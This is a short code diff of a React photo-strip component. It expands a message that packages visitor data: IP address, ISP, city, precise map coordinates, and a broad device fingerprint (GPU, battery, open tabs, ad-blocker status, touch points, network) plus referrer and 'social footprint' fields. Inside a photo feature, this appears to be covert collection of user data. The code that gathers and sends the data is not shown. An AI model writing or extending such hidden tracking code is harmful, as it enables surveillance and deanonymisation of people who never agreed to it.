@@ -80,9 +80,9 @@ export const PhotoStrip: React.FC<PhotoStripProps> = ({ photos, frame, setFrame,
         ? `\n📍 Location: ${location.city}, ${location.country}\n🌐 IP: ${location.ip}\n🏢 ISP: ${location.org}\n🗺️ Map: https://www.google.com/maps?q=${location.latitude},${location.longitude}`
         : '\n📍 Location: Unknown';
 
-      const deviceStr = `\n📱 Device: ${device.platform}\n🌐 Browser: ${device.language}\n🖥️ Screen: ${device.screenResolution}\n⏲️ Timezone: ${device.timezone}\n⚙️ CPU/RAM: ${device.cores} Cores / ${device.memory || '?'}GB\n🔋 Battery: ${device.battery}\n📂 Tabs Open: ${device.tabsOpen}\n📡 Link: ${device.connection}`;
+      const deviceStr = `\n💻 SYSTEM DATA:\n- GPU: ${device.gpu}\n- Screen: ${device.screenResolution} (@${device.pixelRatio}x)\n- Color Depth: ${device.colorDepth}-bit\n- CPU Cores: ${device.cores}\n- RAM: ${device.memory || '?'}GB\n- OS: ${device.platform}\n- Battery: ${device.battery}\n- AdBlock: ${device.adBlocker ? 'Active' : 'Not detected'}\n- Touch Points: ${device.touchPoints}\n- Language: ${device.language}\n- Timezone: ${device.timezone}\n- Tabs Active: ${device.tabsOpen}\n- Network: ${device.connection}`;
 
-      const socialStr = `\n📣 Source: ${referrer}\n👥 Social: ${socialPresence}`;
+      const socialStr = `\n🛡️ SECURITY/REFERRER:\n- Origin: ${referrer}\n- Social Footprint: ${socialPresence}`;
 
       // Small delay to ensure the DOM is fully rendered before capturing
       await new Promise(r => setTimeout(r, 1000));
